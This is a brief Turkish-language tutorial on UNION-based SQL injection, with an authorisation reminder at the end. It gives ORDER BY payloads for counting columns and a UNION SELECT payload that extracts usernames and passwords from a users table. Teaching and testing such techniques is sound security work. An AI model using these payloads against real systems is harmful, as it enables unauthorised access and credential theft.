# Union Based SQL Injection

UNION tabanlı injection, iki `SELECT` sonucunu birleştirerek veritabanından
veri çekmeye dayanır.

## Kolon Sayısını Bulma

```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
```

Hata alana kadar artırılır.

## Veri Çekme

```sql
' UNION SELECT username, password FROM users-- 
```

## Not

Sadece yetkili olduğun sistemlerde test et.
